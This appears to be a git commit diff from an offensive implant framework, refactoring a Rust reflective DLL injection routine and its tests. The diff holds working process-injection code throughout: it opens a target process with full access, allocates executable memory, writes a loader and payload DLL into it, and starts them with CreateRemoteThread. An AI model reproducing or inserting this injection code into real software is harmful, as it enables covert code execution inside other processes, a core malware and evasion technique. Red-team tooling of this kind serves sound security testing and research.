8c99dfbd3f1f83a0d3241ce4449af10135a98552
Hulto <7121375+hulto@users.noreply.github.com>
2023-05-31 20:04:26 -0700

    Clea up and improve testing.

--- implants/eldritch/src/sys/dll_reflect_impl.rs
+++ implants/eldritch/src/sys/dll_reflect_impl.rs
@@ -1,12 +1,11 @@
-use std::io;
-use std::{os::raw::c_void, ptr::null_mut, mem::size_of};
-use std::ffi::CStr;
+use std::{os::raw::c_void, ptr::null_mut};
 use object::{Object, ObjectSection};
 use object::LittleEndian as LE;
 
 use starlark::values::none::NoneType;
+use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
 use windows_sys::Win32::System::Threading::CreateRemoteThread;
-use windows_sys::Win32::{System::{SystemServices::{IMAGE_DOS_HEADER, IMAGE_IMPORT_DESCRIPTOR, IMAGE_EXPORT_DIRECTORY}, Diagnostics::Debug::{IMAGE_NT_HEADERS64, WriteProcessMemory, IMAGE_DATA_DIRECTORY, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_DIRECTORY_ENTRY_EXPORT}, Threading::{OpenProcess, PROCESS_ALL_ACCESS, PROCESS_ACCESS_RIGHTS}, Memory::{VirtualAllocEx, VIRTUAL_ALLOCATION_TYPE, PAGE_PROTECTION_FLAGS, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE}}, Foundation::{GetLastError, BOOL, HANDLE, FALSE}};
+use windows_sys::Win32::{System::{SystemServices::{IMAGE_DOS_HEADER}, Diagnostics::Debug::{IMAGE_NT_HEADERS64, WriteProcessMemory}, Threading::{OpenProcess, PROCESS_ALL_ACCESS, PROCESS_ACCESS_RIGHTS}, Memory::{VirtualAllocEx, VIRTUAL_ALLOCATION_TYPE, PAGE_PROTECTION_FLAGS, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE}}, Foundation::{GetLastError, BOOL, HANDLE, FALSE}};
 
 
 
@@ -56,6 +55,22 @@ fn write_process_memory(hprocess: HANDLE, lpbaseaddress: *const c_void, lpbuffer
     Ok(lpnumberofbyteswritten)
 }
 
+// fn CreateRemoteThread(hprocess: isize, lpthreadattributes: *const SECURITY_ATTRIBUTES, dwstacksize: usize, lpstartaddress: Option<fn(*mut c_void) -> u32>, lpparameter: *const c_void, dwcreationflags: u32, lpthreadid: *mut u32) -> isize
+fn create_remote_thread(hprocess: isize, lpthreadattributes: *const SECURITY_ATTRIBUTES, dwstacksize: usize, lpstartaddress: Option<*mut c_void>, lpparameter: *const c_void, dwcreationflags: u32, lpthreadid: *mut u32) -> anyhow::Result<isize> {
+    let tmp_lpstartaddress: Option<unsafe extern "system" fn(_) -> _> = match lpstartaddress {
+        Some(local_lpstartaddress) => Some(unsafe { std::mem::transmute(local_lpstartaddress) }),
+        None => todo!(),
+    };
+    let res = unsafe{CreateRemoteThread(hprocess, lpthreadattributes, dwstacksize, tmp_lpstartaddress, lpparameter, dwcreationflags, lpthreadid)};
+    if res == 0 {
+        let error_code = unsafe { GetLastError() };
+        if error_code != 0 {
+            return Err(anyhow::anyhow!("Failed to create remote thread. Last error returned: {}", error_code))
+        }
+    }
+    Ok(res)
+}
+
 fn get_export_address_by_name(pe_bytes: &[u8], export_name: &str) -> anyhow::Result<usize> {
     let pe_file = object::read::pe::PeFile64::parse(pe_bytes)?;//object::File::parse(pe_bytes)?;
 
@@ -93,42 +108,55 @@ fn handle_dll_reflect(target_dll_bytes: Vec<u8>, pid:u32) -> anyhow::Result<()>{
     let nt_header = (reflective_loader_dll.as_ptr() as usize + (unsafe { *dos_header }).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
     let image_size = (unsafe { *nt_header }).OptionalHeader.SizeOfImage;
 
-    let process_handle = open_process(PROCESS_ALL_ACCESS, 0, pid)?;
+    let process_handle = open_process(
+        PROCESS_ALL_ACCESS, 
+        0, 
+        pid)?;
 
-    let remote_buffer = virtual_alloc_ex(process_handle, null_mut(), image_size as usize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)?;
-    let _loader_bytes_written = write_process_memory(process_handle, remote_buffer as _, reflective_loader_dll.as_ptr() as _, image_size as usize)?;
+    // Allocate and write loader to remote process
+    let remote_buffer = virtual_alloc_ex(
+        process_handle, 
+        null_mut(), 
+        image_size as usize, 
+        MEM_COMMIT | MEM_RESERVE, 
+        PAGE_EXECUTE_READWRITE)?;
 
-    println!("target_dll_bytes: {:?}", target_dll_bytes.as_slice().as_ptr());
-    println!("Hit me!");
-    let stdin_handle = io::stdin();
-    let mut tmp_string = String::new();
-    let _ = stdin_handle.read_line(&mut tmp_string).unwrap();
+    let _loader_bytes_written = write_process_memory(
+        process_handle, 
+        remote_buffer as _, 
+        reflective_loader_dll.as_ptr() as _, 
+        image_size as usize)?;
 
-    let remote_buffer_target_dll: *mut std::ffi::c_void = virtual_alloc_ex(process_handle, null_mut(), target_dll_bytes.len() as usize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)?;
-    let _payload_bytes_written = write_process_memory(process_handle, remote_buffer_target_dll as _, target_dll_bytes.as_slice().as_ptr() as _, target_dll_bytes.len() as usize)?;
+    // Allocate and write payload to remote process
+    let remote_buffer_target_dll: *mut std::ffi::c_void = virtual_alloc_ex(
+        process_handle, 
+        null_mut(), 
+        target_dll_bytes.len() as usize,
+        MEM_COMMIT | MEM_RESERVE, 
+        PAGE_EXECUTE_READWRITE)?;
+    
+    let _payload_bytes_written = write_process_memory(
+        process_handle, 
+        remote_buffer_target_dll as _, 
+        target_dll_bytes.as_slice().as_ptr() as _, 
+        target_dll_bytes.len() as usize)?;
 
+    // Find the loader entrypoint and hand off execution
     // entrypoint bytes: 41 57 41 56 41 55 41 54 56 57 55 53 48 81 EC B8 06 00 00 48 8B 51 08 48 89 8C 24 F8 00 00 00 4C 8B 41 10 48 8D B4 24 30 05 00 00 48 89 F1
-    let loader_address_offset = get_export_address_by_name(reflective_loader_dll, loader_function_name)?;
-    println!("{:#08x}", loader_address_offset);
+    let loader_address_offset = get_export_address_by_name(
+        reflective_loader_dll, 
+        loader_function_name)?;
     let loader_address = loader_address_offset + remote_buffer as usize;
-    println!("{:#08x}", loader_address);
 
-    println!("Hit me!");
-    let stdin_handle = io::stdin();
-    let mut tmp_string = String::new();
-    let _ = stdin_handle.read_line(&mut tmp_string).unwrap();
-
-    let _thread_handle = unsafe { 
-        CreateRemoteThread(
+    let _thread_handle = create_remote_thread(
         process_handle,
         null_mut(),
         0,
-        Some(std::mem::transmute(loader_address as usize)),
+        Some(loader_address as *mut c_void),
         remote_buffer_target_dll,
         0,
         null_mut(),
-        )
-    };
+        );
 
     Ok(())
 }
@@ -149,18 +177,39 @@ mod tests {
     use tempfile::NamedTempFile;
     use std::{process::Command, time, thread, path::Path, fs};
 
+
+    #[test]
+    fn test_dll_reflect_get_u8_vec_form_u32_vec_simple() -> anyhow::Result<()> {
+        let test_input: Vec<u32> = vec![0, 2, 15 ];
+        let expected_output: Vec<u8> = vec![0, 2, 15];
+        let res = get_u8_vec_form_u32_vec(test_input)?;
+        assert_eq!(res, expected_output);
+        Ok(())
+    }
+
+    #[test]
+    fn test_dll_reflect_get_u8_vec_form_u32_vec_fail() -> anyhow::Result<()> {
+        let test_input: Vec<u32> = vec![0, 2, 16 ];
+        let err_str = match get_u8_vec_form_u32_vec(test_input) {
+            Ok(_) => "No error".to_string(),
+            Err(local_err) => local_err.to_string(),
+        };
+        assert_eq!("No error".to_string(), err_str);
+        Ok(())
+    }
+
     #[test]
     fn test_dll_reflect_lookup_export() -> anyhow::Result<()> {
         let test_dll_bytes = include_bytes!("..\\..\\..\\..\\bin\\reflective_loader\\target\\release\\reflective_loader.dll");
         let loader_address_offset: usize = get_export_address_by_name(test_dll_bytes, "reflective_loader")?;
-        assert_eq!(loader_address_offset, 0x432);
+        assert_eq!(loader_address_offset, 0xBC0);
         Ok(())
     }
 
     #[test]
     fn test_dll_reflect_simple() -> anyhow::Result<()> {
         let test_dll_bytes = include_bytes!("..\\..\\..\\..\\bin\\create_file_dll\\target\\debug\\create_file_dll.dll");
-        const DLL_EXEC_WAIT_TIME: u64 = 5;
+        const DLL_EXEC_WAIT_TIME: u64 = 3;
         
         // Get unique and unused temp file path
         let tmp_file = NamedTempFile::new()?;
